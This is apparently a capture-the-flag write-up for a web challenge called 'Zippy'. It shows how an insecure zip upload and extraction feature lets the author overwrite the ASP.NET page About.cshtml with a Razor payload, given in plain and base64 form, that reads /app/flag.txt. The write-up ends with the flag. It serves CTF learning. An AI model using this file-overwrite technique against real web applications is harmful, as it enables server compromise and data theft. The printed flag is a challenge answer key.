## Name: Zippy
#### Author: @HuskyHacks
#### Category: Web
#### Difficulty: N/D
#### Description: Need a quick solution for archiving your business files? Try Zippy today, the Zip Archiver built for the small to medium business!

## Procedure
no code available for this web chall, we need to navegate in the website and test every single function available in the website; after check we have 3 interesting pages, ```/Logs, /Browse and /Upload```, upload page allow us send ```.zip and .7z``` file, and Browser show us the zip content.

After upload a test zip file, u can see the msg ```File uploaded successfully to /app/wwwroot/uploads/sp34rh34d for account test (ID: sp34rh34d)```, here there is a useful info ```/app/``` the app path, maybe we may need it in the future.

<img width="1427" alt="Screenshot 2024-11-02 at 9 51 06 PM" src="https://github.com/user-attachments/assets/a1904ab7-12b2-445f-9e1f-ad37e769e40f">

Browser asks us for the file path, it was ```uploads/sp34rh34d```, it show us the content for our test zip file.

<img width="1437" alt="Screenshot 2024-11-02 at 9 56 34 PM" src="https://github.com/user-attachments/assets/3e1fc47d-cddd-4461-9272-96ec673aa5c2">

if we use ```/app``` in browser page, we can see the app content and our flag.txt file, so we need to find the way to extract our flag.

<img width="1434" alt="Screenshot 2024-11-02 at 9 59 00 PM" src="https://github.com/user-attachments/assets/09f62001-bbeb-4835-b941-b33bf3935b58">

I have seen and interesting thing when i use the browser page, after some uploaded zip files, it shows us the zip content, but it extracts the content of the zip file too. so maybe we can override a file from webpage. Go to browser and then send ```/app/Pages``` to see what pages we can override using the upload page.

<img width="1432" alt="Screenshot 2024-11-02 at 10 04 19 PM" src="https://github.com/user-attachments/assets/4c60faed-aede-48a8-b12c-1b69c7c64926">

this is a c# web project, after read a little about it, we just need to override a ```.cshtml``` file, so i have selected ```About.cshtml```. we have to send the page context encoded with base64 and specify the filename as ```About.cshtml``` and the upload route ```/app/Pages/```, then should be enough refresh About page to recover the flag.


About.cshtml file
```
@page
@{
    ViewData["Title"] = "About";
    string flagContent = "Flag not found.";

    string filePath = "/app/flag.txt"; // Ensure the path is correct and accessible

    if (System.IO.File.Exists(filePath))
    {
        flagContent = System.IO.File.ReadAllText(filePath);
    }
}

<h1>@ViewData["Title"]</h1>

<p>Flag Content:</p>
<pre>@flagContent</pre>
```

encoded with base64
```
QHBhZ2UKQHsKICAgIFZpZXdEYXRhWyJUaXRsZSJdID0gIkFib3V0IjsKICAgIHN0cmluZyBmbGFnQ29udGVudCA9ICJGbGFnIG5vdCBmb3VuZC4iOwoKICAgIHN0cmluZyBmaWxlUGF0aCA9ICIvYXBwL2ZsYWcudHh0IjsgLy8gRW5zdXJlIHRoZSBwYXRoIGlzIGNvcnJlY3QgYW5kIGFjY2Vzc2libGUKCiAgICBpZiAoU3lzdGVtLklPLkZpbGUuRXhpc3RzKGZpbGVQYXRoKSkKICAgIHsKICAgICAgICBmbGFnQ29udGVudCA9IFN5c3RlbS5JTy5GaWxlLlJlYWRBbGxUZXh0KGZpbGVQYXRoKTsKICAgIH0KfQoKPGgxPkBWaWV3RGF0YVsiVGl0bGUiXTwvaDE+Cgo8cD5GbGFnIENvbnRlbnQ6PC9wPgo8cHJlPkBmbGFnQ29udGVudDwvcHJlPgo=
```
final payload

<img width="1315" alt="Screenshot 2024-11-02 at 10 14 00 PM" src="https://github.com/user-attachments/assets/68872907-5f45-4061-8e7b-a2ce33d01174">

Go to About pages, and it will show us our flag.

<img width="1419" alt="Screenshot 2024-11-02 at 10 14 55 PM" src="https://github.com/user-attachments/assets/8cb5bafc-7d31-4746-8158-556e8641322c">

flag ```flag{a074eb7973c4c718790baefc096654dd}```
